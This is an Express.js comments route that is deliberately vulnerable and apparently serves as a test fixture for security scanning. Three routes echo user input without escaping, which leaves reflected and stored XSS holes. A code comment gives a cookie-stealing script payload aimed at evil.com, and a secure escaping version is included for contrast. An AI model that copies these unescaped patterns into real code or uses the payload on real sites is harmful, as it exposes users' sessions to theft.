/**
 * Comments Route - Contains XSS Vulnerability
 * WARNING: This code is intentionally vulnerable for testing purposes
 */

const express = require('express');
const router = express.Router();

// In-memory storage for demo purposes
const comments = [];

// POST /api/comments
// VULNERABILITY #2: Cross-Site Scripting (XSS) - HIGH severity
router.post('/', (req, res) => {
  const comment = req.body.comment;
  
  // Dangerous: Rendering user input directly without sanitization
  // An attacker could submit: <script>alert('XSS')</script>
  // Or steal cookies: <script>fetch('http://evil.com?cookie='+document.cookie)</script>
  res.send(`<div class="comment">
    <p>Your comment has been posted:</p>
    <div class="content">${comment}</div>
  </div>`);
  
  // Store for later (also vulnerable when retrieved)
  comments.push({
    id: comments.length + 1,
    content: comment,
    timestamp: new Date()
  });
});

// GET /api/comments
// Also vulnerable when displaying stored comments
router.get('/', (req, res) => {
  let html = '<html><body><h1>Comments</h1><ul>';
  
  comments.forEach(comment => {
    // Dangerous: No HTML escaping
    html += `<li>${comment.content}</li>`;
  });
  
  html += '</ul></body></html>';
  res.send(html);
});

// GET /api/comments/:id
router.get('/:id', (req, res) => {
  const comment = comments.find(c => c.id === parseInt(req.params.id));
  
  if (!comment) {
    return res.status(404).send('Comment not found');
  }
  
  // Vulnerable: Unescaped output
  res.send(`<div>${comment.content}</div>`);
});

// SECURE EXAMPLE (for contrast - should not trigger alerts)
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

router.post('/secure', (req, res) => {
  const comment = req.body.comment;
  const sanitized = escapeHtml(comment);
  
  res.send(`<div class="comment">
    <p>Your comment has been posted:</p>
    <div class="content">${sanitized}</div>
  </div>`);
});

module.exports = router;
